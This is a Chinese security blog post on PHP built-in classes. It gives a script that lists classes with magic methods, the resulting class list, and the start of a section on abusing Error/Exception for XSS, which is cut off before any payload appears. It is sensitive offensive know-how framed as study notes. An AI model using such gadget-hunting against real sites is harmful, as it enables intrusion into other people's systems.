<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php原生类 | AsaL1n's blog</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="php原生类1.php原生类php为了解决一些常见的问题，存在一些基本的类提供给我们可以去使用（SPL），这是用于解决典型问题(standard problems)的一组接口与类的集合。 列出所有的内置类 12345678910111213141516171819202122 &lt;?php$classes &#x3D; get_declared_classes();foreach ($classes a">
<meta property="og:type" content="article">
<meta property="og:title" content="php原生类">
<meta property="og:url" content="https://asal1n.github.io/2023/08/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/index.html">
<meta property="og:site_name" content="AsaL1n&#39;s blog">
<meta property="og:description" content="php原生类1.php原生类php为了解决一些常见的问题，存在一些基本的类提供给我们可以去使用（SPL），这是用于解决典型问题(standard problems)的一组接口与类的集合。 列出所有的内置类 12345678910111213141516171819202122 &lt;?php$classes &#x3D; get_declared_classes();foreach ($classes a">
<meta property="og:locale">
<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
<meta property="article:published_time" content="2023-08-20T16:00:00.000Z">
<meta property="article:modified_time" content="2023-10-31T08:03:11.857Z">
<meta property="article:author" content="AsaL1n">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2023/08/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'php原生类',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-31 16:03:11'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="AsaL1n's blog"><span class="site-name">AsaL1n's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php原生类</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-20T16:00:00.000Z" title="Created 2023-08-21 00:00:00">2023-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-31T08:03:11.857Z" title="Updated 2023-10-31 16:03:11">2023-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php原生类"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h1><h2 id="1-php原生类"><a href="#1-php原生类" class="headerlink" title="1.php原生类"></a>1.php原生类</h2><p>php为了解决一些常见的问题，存在一些基本的类提供给我们可以去使用（SPL），这是用于解决<code>典型问题(standard problems)</code>的一组接口与类的集合。</p>
<p>列出所有的内置类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到很多的类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ValueError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ValueError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnhandledMatchError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnhandledMatchError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FiberError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">FiberError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\RandomError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\RandomError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Random\BrokenRandomEngineError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\BrokenRandomEngineError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Random\RandomException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\RandomException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionUnionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionIntersectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionAttribute</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnum</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnumUnitCase</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnumBackedCase</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PhpToken</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure>

<p>学习常见的各种类，包括</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure>

<p>记录一些利用思路</p>
<h2 id="2-使用-Error-Exception-内置类进行-XSS"><a href="#2-使用-Error-Exception-内置类进行-XSS" class="headerlink" title="2.使用 Error&#x2F;Exception 内置类进行 XSS"></a>2.使用 Error&#x2F;Exception 内置类进行 XSS</h2><p>适用于php7版本<br>在开启报错的情况下</p>
<h3 id="1-error类"><a href="#1-error类" class="headerlink" title="1.error类"></a>1.error类</h3><p>我们分析error的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Error</span> <span class="keyword">implements</span> <span class="title">Stringable</span>, <span class="title">Throwable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$line</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$previous</span> = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$trace</span> = [];</span><br><span class="line">    <span class="comment">/*message：错误消息内容</span></span><br><span class="line"><span class="comment">      code：错误代码</span></span><br><span class="line"><span class="comment">      file：抛出错误的文件名</span></span><br><span class="line"><span class="comment">      line：抛出错误在该文件中的行数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span>(<span class="params"></span>): <span class="title">int</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getLine</span>(<span class="params"></span>): <span class="title">int</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getMessage</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrevious</span>(<span class="params"></span>): <span class="title">Throwable</span>|<span class="title">null</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getTrace</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getTraceAsString</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$code</span> = <span class="number">0</span>, <span class="variable">$previous</span> = <span class="literal">null</span></span>) </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123; <span class="comment">/* function body is hidden */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里存在一个tostring方法，显然当对象作为字符串输出或者比较的时候，就会触发这里的tostring函数</p>
